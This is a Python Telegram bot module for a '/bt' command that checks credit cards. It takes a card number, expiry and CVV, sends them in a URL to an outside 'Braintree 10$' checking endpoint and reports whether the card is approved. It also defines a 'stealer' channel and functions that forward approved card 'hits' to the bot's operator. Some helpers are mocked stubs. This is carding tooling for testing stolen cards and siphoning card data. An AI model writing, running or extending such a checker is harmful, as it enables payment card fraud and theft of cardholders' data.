import httpx
import time
import asyncio
from pyrogram import Client, filters

# Mocking necessary functions for standalone script generation
async def check_all_thing(Client, message): return [True, "user"]
async def getmessage(message): return ["4100400157539308", "08", "2026", "126"]
async def get_bin_details(cc): return ["VISA", "DEBIT", "PLATINUM", "BANK OF AMERICA", "US", "🇺🇸", "USD"]
async def setantispamtime(user_id): pass
async def deductcredit(user_id): pass
async def sendcc(finalresp, session): pass
async def error_log(exc): print(f"Error: {exc}")

# Replace with your actual channel ID if needed
STEALER_CHANNEL_ID = -1002549777556

async def send_hit_if_approved(client: Client, text: str):
    try:
        # await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
        print(f"[Stealer] Sending hit: {text}")
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")

@Client.on_message(filters.command("bt", [".", "/"]))
async def braintree_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)

        gateway = "Braintree 10$ 💸"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc == False:
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» Braintree 10$ - CHECK\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway} \n\n<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /bt cc|month|year|cvc"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        bin6 = cc[:6]  # BIN for easy reference
        
        # Now define endpoint_url after fullcc is defined
        endpoint_url = f"https://onyxenvbot.up.railway.app/braintree/key=yashikaaa/cc={fullcc}"

        firstresp = f"""\n↯ Checking.\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□\n</b>\n"""
        # await asyncio.sleep(0.5)
        # firstchk = await message.reply_text(firstresp, message.id)
        print(firstresp)

        secondresp = f"""\n↯ Checking..\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□\n"""
        # await asyncio.sleep(0.5)
        # secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
        print(secondresp)

        start = time.perf_counter()
        session = httpx.AsyncClient(timeout=30, follow_redirects=True)
        
        # Make the GET request to the specific gateway endpoint
        try:
            response_obj = await session.get(endpoint_url)
            result_json = response_obj.json()
            status = result_json.get("status", "Unknown")
            response = result_json.get("response", "No response message")
        except httpx.RequestError as e:
            status = "Error"
            response = f"Request failed: {e}"
        except ValueError:
            status = "Error"
            response = "Invalid JSON response"

        # getbin = await get_bin_details(cc) # This would be an external call
        getbin = ["VISA", "DEBIT", "PLATINUM", "BANK OF AMERICA", "US", "🇺🇸", "USD"]

        thirdresp = f"""\n↯ Checking...\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■\n"""
        # await asyncio.sleep(0.5)
        # thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
        print(thirdresp)

        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""
        currency = getbin[6] if len(getbin) > 6 else "Unknown"

        vbv_status = "Not Found" # Mocked for now
        proxy_status = "Live ✨"
        
        end = time.perf_counter()
        elapsed_time = round(end - start, 2)

        finalresp = f"""\n[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\n[〄] 𝘾𝙊𝙐𝙉𝗧𝗥𝗬⟶ {country} {flag}\n\n━━━〔 META 〕━━━\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}\n[〄] 𝗧𝙄𝗠𝗘 ⟶  {elapsed_time:0.2f}s\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href=\'tg://user?id={user_id}\'> User</a> {role} \n\n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>\n"""

        # await asyncio.sleep(0.5)
        # await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
        print(finalresp)
        await setantispamtime(user_id)
        await deductcredit(user_id)

        if status == "Approved ✅":
            await sendcc(finalresp, session)

        await session.aclose()

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
